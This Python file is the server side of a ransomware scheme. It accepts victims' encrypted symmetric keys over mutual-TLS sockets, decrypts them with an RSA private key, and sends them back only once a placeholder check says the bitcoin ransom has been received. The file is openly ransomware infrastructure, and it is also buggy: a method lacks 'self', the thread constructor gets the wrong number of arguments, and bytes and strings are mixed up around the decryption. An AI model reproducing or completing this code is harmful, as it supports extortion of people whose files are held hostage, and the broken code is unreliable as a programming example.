import socketserver
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import socket
import ssl
import threading

class ClientThread(threading.Thread):

    def __init__(self, conn, ip, port) -> None:
        threading.Thread.__init__(self)
        self.conn = conn
        self.ip = ip
        self.port = port
        print("[+] New server socket threat started for {}:{}".format(ip, str(port)))
    
    # Runs when the thread is called to start
    def run(self):
        encrypted_key = (self.conn.recv(4096)).decode()
        print("Decrypting " + encrypted_key )

        with open(private_key_path, "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None
            )

        decrypted_symmetric_key = private_key.decrypt(
            encrypted_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        if self.bitcoin_received():
            self.conn.send(decrypted_symmetric_key.encode())
    
    
    # Some pseudocode to check if the ransom has been received
    def bitcoin_received() -> bool:
        print("Check bitcoin")
        return True

if __name__ == "__main__":
    
    private_key_path = "" # For symmetric private key
    client_cert = 'path/to/client.crt'
    server_key = 'path/to/server.key'
    server_cert = 'path/to/server.crt'
    port = 8080

    # Create the SSL wrapper
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations(cafile=client_cert)
    context.load_cert_chain(certfile=server_cert, keyfile=server_key)
    context.options |= ssl.OP_SINGLE_ECDH_USE
    context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
        sock.bind(('', port))
        sock.listen(5) # 5 Backlog requests

        with context.wrap_socket(sock, server_side=True) as ssock:
            while True:
                conn, addr = ssock.accept()
                print(addr)
                handlerThread = ClientThread(conn, addr)
                handlerThread.start()

    